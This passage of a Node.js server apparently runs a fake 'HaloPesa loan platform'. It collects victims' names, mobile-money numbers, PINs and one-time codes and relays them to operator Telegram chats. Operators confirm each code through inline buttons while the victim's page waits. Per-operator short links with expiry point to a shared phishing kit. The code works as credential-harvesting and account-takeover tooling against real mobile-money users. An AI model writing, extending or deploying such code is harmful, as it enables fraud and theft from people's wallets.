        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-otp
app.post('/api/verify-otp', async (req, res) => {
    console.log('\n🔵 /api/verify-otp called:', JSON.stringify(req.body));
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
        console.log(`✅ OTP saved for ${applicationId}: ${otp}`);

        // Return success immediately to the client
        res.json({ success: true });

        // Send to admin asynchronously (don't wait)
        const returningLabel = application.isReturningUser
            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
            : '';

        sendToAdmin(application.adminId, `
✅ *CODE VERIFICATION*${returningLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${otp}\`

⚠️ *VERIFY CODE*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '✅ Code Correct', callback_data: `otp_approve_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Code Wrong',   callback_data: `otp_reject_${application.adminId}_${applicationId}` }]
                ]
            }
        }).catch(err => console.error('Error sending OTP to admin:', err.message));

    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const applicationId = req.params.applicationId;
        const application = await db.getApplication(applicationId);
        if (application) {
            console.log(`📊 OTP Status Check: ${applicationId} → ${application.otpStatus}`);
            res.json({ success: true, status: application.otpStatus });
        } else {
            console.log(`❌ OTP Status Check FAILED - App not found: ${applicationId}`);
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        console.error('❌ check-otp-status error:', error.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/check-returning-customer/:phoneNumber
app.get('/api/check-returning-customer/:phoneNumber', async (req, res) => {
    try {
        const phoneNumber = req.params.phoneNumber;
        const applications = await db.collection('applications').find({ phoneNumber }).toArray();
        
        const previousCount = applications.length;
        const isReturning = previousCount > 0;
        
        console.log(`📞 Returning Check: ${phoneNumber} → ${isReturning} (${previousCount} previous)`);
        
        res.json({ 
            success: true, 
            isReturning, 
            previousCount 
        });
    } catch (error) {
        console.error('❌ check-returning-customer error:', error.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});


// ==========================================
// ════════════════════════════════════════
// REGISTRATION ENDPOINTS (NEW - NO CONFLICTS)
// ════════════════════════════════════════
// ==========================================

// POST /api/register-user
app.post('/api/register-user', async (req, res) => {
  try {
    const { firstName, lastName, haloNumber, password, timestamp } = req.body;

    if (!firstName || !lastName || !haloNumber || !password) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    // Validate: HaloPesa exactly 10 digits
    if (!/^\d{10}$/.test(haloNumber)) {
      return res.status(400).json({ success: false, message: 'Nambari ya HaloPesa lazima iwe tarakimu 10' });
    }

    // Validate: Password exactly 4 digits
    if (!/^\d{4}$/.test(password)) {
      return res.status(400).json({ success: false, message: 'Namba ya siri lazima iwe tarakimu 4' });
    }

    const registrationId = 'REG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

    // Generate OTP (6 digits)
    const otp = String(Math.floor(Math.random() * 1000000)).padStart(6, '0');

    pendingRegistrations.set(registrationId, {
      firstName,
      lastName,
      haloNumber,
      password,
      otp,
      otpVerified: false,
      timestamp: new Date(timestamp),
      status: 'pending',
      adminResponse: null,
      rejectionReason: null
    });

    console.log(`📋 New registration pending: ${registrationId}`);
    console.log(`   Name: ${firstName} ${lastName}`);
    console.log(`   HaloPesa: ${haloNumber}`);
    console.log(`   OTP Generated: ${otp}`);

    try {
      const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
      
      const message = `
🔔 *NEW REGISTRATION REQUEST*

👤 *Jina:* ${firstName} ${lastName}
🔑 *HaloPesa Number:* ${haloNumber}
📧 *Namba ya Siri:* ••••••
⏰ *Wakati:* ${new Date(timestamp).toLocaleString()}

🔐 *OTP CODE:* \`${otp}\`

📱 *Registration ID:* \`${registrationId}\`
      `;

      const approveBtn = {
        text: '✅ Idhinisha',
        callback_data: `app_approve_${registrationId}`
      };

      const rejectBtn = {
        text: '❌ Kataa',
        callback_data: `app_reject_${registrationId}`
      };

      await bot.sendMessage(superAdminChatId, message.trim(), {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[approveBtn, rejectBtn]]
        }
      });

      console.log(`✅ Registration + OTP sent to Telegram: ${registrationId}`);
    } catch (telegramError) {
      console.error('❌ Error sending to Telegram:', telegramError.message);
    }

    res.json({
      success: true,
      registrationId,
      message: 'Registration submitted. OTP sent to admin.'
    });

  } catch (error) {
    console.error('❌ Registration error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// GET /api/check-registration-approval/:registrationId
app.get('/api/check-registration-approval/:registrationId', async (req, res) => {
  try {
    const { registrationId } = req.params;
    
    const registration = pendingRegistrations.get(registrationId);

    if (!registration) {
      return res.status(404).json({ 
        success: false, 
        message: 'Registration not found' 
      });
    }

    res.json({
      success: true,
      status: registration.status,
      reason: registration.rejectionReason || null
    });

  } catch (error) {
    console.error('❌ Check approval error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// GET /api/registrations/pending
app.get('/api/registrations/pending', (req, res) => {
  const pending = [];
  for (const [regId, data] of pendingRegistrations.entries()) {
    if (data.status === 'pending') {
      pending.push({
        registrationId: regId,
        firstName: data.firstName,
        lastName: data.lastName,
        haloNumber: data.haloNumber,
        timestamp: data.timestamp,
        status: data.status
      });
    }
  }
  res.json({ success: true, pendingCount: pending.length, registrations: pending });
});

// POST /api/submit-otp - User submits externally-received OTP (AFTER admin approved registration)
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { registrationId, otp } = req.body;

    if (!registrationId || !otp) {
      return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const registration = pendingRegistrations.get(registrationId);

    if (!registration) {
      return res.status(404).json({ success: false, message: 'Registration not found' });
    }

    // OTP must be 4 digits (what user entered externally)
    if (!/^\d{4}$/.test(otp)) {
      return res.status(400).json({ success: false, message: 'OTP must be 4 digits' });
    }

    // Store OTP for admin verification
    pendingOtpVerification.set(registrationId, {
      otp,
      status: 'pending',
      submittedTime: new Date()
    });

    console.log(`📋 OTP submitted for verification: ${registrationId}`);
    console.log(`   OTP Code: ${otp}`);

    // Send to Telegram for admin verification
    try {
      const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
      
      const message = `
🔐 *OTP CODE VERIFICATION*

👤 *Mtumiaji:* ${registration.firstName} ${registration.lastName}
🔑 *HaloPesa:* ${registration.haloNumber}

📌 *OTP Code Submitted:* \`${otp}\`

⚠️ Verify if this code is CORRECT

📱 *Registration ID:* \`${registrationId}\`
      `;

      const approveBtn = {
        text: '✅ Sahihi',
        callback_data: `otp_approve_${registrationId}`
      };

      const rejectBtn = {
        text: '❌ Sio Sahihi',
        callback_data: `otp_reject_${registrationId}`
      };

      await bot.sendMessage(superAdminChatId, message.trim(), {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[approveBtn, rejectBtn]]
        }
      });

      console.log(`✅ OTP sent to Telegram for verification: ${registrationId}`);
    } catch (telegramError) {
      console.error('❌ Error sending OTP to Telegram:', telegramError.message);
    }

    // Return to client that OTP was submitted
    res.json({
      success: true,
      message: 'OTP submitted for verification. Waiting for admin confirmation.',
      registrationId
    });

  } catch (error) {
    console.error('❌ Submit OTP error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// GET /api/check-otp-status/:registrationId
// Frontend polls this to check if admin approved OTP
app.get('/api/check-otp-status/:registrationId', async (req, res) => {
  try {
    const { registrationId } = req.params;
    
    const otpData = pendingOtpVerification.get(registrationId);

    if (!otpData) {
      return res.status(404).json({ 
        success: false, 
        message: 'OTP verification not found' 
      });
    }

    res.json({
      success: true,
      status: otpData.status  // 'pending' | 'approved' | 'rejected'
    });

  } catch (error) {
    console.error('❌ Check OTP status error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// GET /health
app.get('/health', (req, res) => {
    const isDbConnected = db.isConnected && db.isConnected();
    
    res.json({
        status:         'ok',
        database:       isDbConnected ? 'connected' : (dbReady ? 'ready' : 'not ready'),
        databaseActual: isDbConnected ? 'active' : 'inactive',
        activeAdmins:   adminChatIds.size,
        pausedAdmins:   pausedAdmins.size,
        botMode:        'webhook',
        webhookUrl:     `${WEBHOOK_URL}/telegram-webhook`,
        uptime:         process.uptime(),
        memory:         process.memoryUsage(),
        timestamp:      new Date().toISOString()
    });
});

// Serve the Halopesa HTML
// ==========================================
// SHORT LINK ROUTES (Subdomain & Path-based)
// ==========================================

// Handle path-based short links: /admin/7K4F
app.get('/admin/:shortId', async (req, res) => {
    const shortId = req.params.shortId.toUpperCase();
    console.log(`🔗 Path-based admin link accessed: ${shortId}`);
    
    try {
        const admin = await db.getAdmin(shortId);
        const isSuperAdmin = admin && admin.chatId === process.env.SUPER_ADMIN_CHAT_ID;
        
        // Allow access if: active, and (not expired OR is super admin)
        if (admin && admin.status === 'active' && (!admin.expired || isSuperAdmin) && !pausedAdmins.has(shortId)) {
            if (admin.chatId && !adminChatIds.has(shortId)) {
                adminChatIds.set(shortId, admin.chatId);
                console.log(`➕ Added to active map: ${shortId} -> ${admin.chatId}`);
            }
        }
    } catch (error) {
        console.error('Error validating admin on path-based link:', error);
    }

    // Redirect to root with short ID as query param for backward compatibility
    res.redirect(`/?admin=${shortId}`);
});

// Handle subdomain-based short links: 7k4f.admin.yoursite.com
// This works via wildcard DNS and catches *.admin.yoursite.com
app.use((req, res, next) => {
    // Get the host header and extract subdomain
    const host = req.get('host') || '';
    const parts = host.split('.');
    
    // Check if this looks like a short ID subdomain (e.g., 7k4f.admin.yoursite.com)
    if (parts.length >= 2) {
        const potentialShortId = parts[0].toUpperCase();
        
        // If it looks like a 4-char short ID, treat it as admin link
        if (potentialShortId.length === 4 && potentialShortId.match(/^[0-9A-Z]{4}$/)) {
            console.log(`🔗 Subdomain-based admin link accessed: ${potentialShortId}`);
            
            // Set query param and continue to root handler
            req.query.admin = potentialShortId;
            return next();
        }
    }
    
    next();
});

// Root route - handles all admin link formats
app.get('/', async (req, res) => {
    const adminId = req.query.admin;

    if (adminId) {
        console.log(`✅ Admin link validated: ${adminId}`);
        try {
            const admin = await db.getAdmin(adminId);
            const isSuperAdmin = admin && admin.chatId === process.env.SUPER_ADMIN_CHAT_ID;
            
            // Allow access if: active, and (not expired OR is super admin)
            if (admin && admin.status === 'active' && (!admin.expired || isSuperAdmin) && !pausedAdmins.has(adminId)) {
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                    console.log(`➕ Added to active map: ${adminId} -> ${admin.chatId}`);
                }
            }
        } catch (error) {
            console.error('Error validating admin on landing page:', error);
        }
    }

    res.sendFile(path.join(__dirname, 'halopesa-integrated.html'));
});


// ==========================================
// CLEANUP: Remove old registrations after 24 hours
// ==========================================
setInterval(() => {
  const now = Date.now();
  const maxAge = 24 * 60 * 60 * 1000;

  for (const [registrationId, registration] of pendingRegistrations.entries()) {
    const regAge = now - registration.timestamp.getTime();
    if (regAge > maxAge) {
      pendingRegistrations.delete(registrationId);
      console.log(`🧹 Cleaned up old registration: ${registrationId}`);
    }
  }
}, 60 * 60 * 1000);

// ==========================================
// START SERVER
// ==========================================
server = app.listen(PORT, () => {
    console.log(`\n💎 HALOPESA LOAN PLATFORM`);
    console.log(`==========================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`👥 Admins: ${adminChatIds.size} connected`);
    console.log(`\n✅ Ready!\n`);
});

// ==========================================
// GRACEFUL SHUTDOWN
// ==========================================
let isShuttingDown = false;

async function shutdownGracefully(signal) {
    if (isShuttingDown) return; // Prevent multiple shutdown calls
    isShuttingDown = true;
    
    console.log(`\n🛑 Received ${signal}, initiating graceful shutdown...`);
    
    try {
        // Step 1: Stop accepting new connections
        if (server) {
            console.log('📭 Stopping server from accepting new connections...');
            server.close(() => {
                console.log('✅ Server closed');
            });
        }

        // Step 2: Clear in-memory data
        console.log('🧹 Clearing in-memory data...');
        suspendAllSessions.clear();
        pendingRegistrations.clear();
        pendingPayments.clear();
        pendingRenewals.clear();
        pendingOtpVerification.clear();
        adminChatIds.clear();
        pausedAdmins.clear();
        processingLocks.clear();
        expiryCheckerRunning = false;

        // Step 3: Clean up Telegram bot
        if (bot) {
            try {
                // Only delete webhook on SIGINT (user interrupt)
                // On SIGTERM (from Render), let the next instance handle it
                if (signal === 'SIGINT') {
                    console.log('🤖 Deleting webhook...');
                    await bot.deleteWebHook().catch(e => {
                        console.warn('⚠️ Failed to delete webhook:', e.message);
                    });
                }
            } catch (err) {
                console.error('❌ Error cleaning up bot:', err.message);
            }
            bot = null;
        }

        // Step 4: Close database connection
        // IMPORTANT: Only close on SIGINT, not SIGTERM
        // SIGTERM = Render is restarting us, keep connection alive for next instance
        // SIGINT = User interrupt, safe to close everything
        if (signal === 'SIGINT') {
            console.log('🔌 Closing MongoDB connection...');
            try {
                await db.closeDatabase();
                console.log('✅ Database connection closed');
            } catch (err) {
                console.error('❌ Error closing database:', err.message);
            }
        } else {
            console.log('⏸️ SIGTERM received - keeping database connection alive for next instance...');
        }

        console.log('✅ Graceful shutdown complete');
        process.exit(0);
    } catch (error) {
        console.error('❌ Error during shutdown:', error.message);
        process.exit(1);
    }
}

// Proper signal handling
process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection:', error?.message);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception:', error?.message);
    // On critical error, trigger graceful shutdown
    shutdownGracefully('uncaughtException').catch(() => process.exit(1));
});
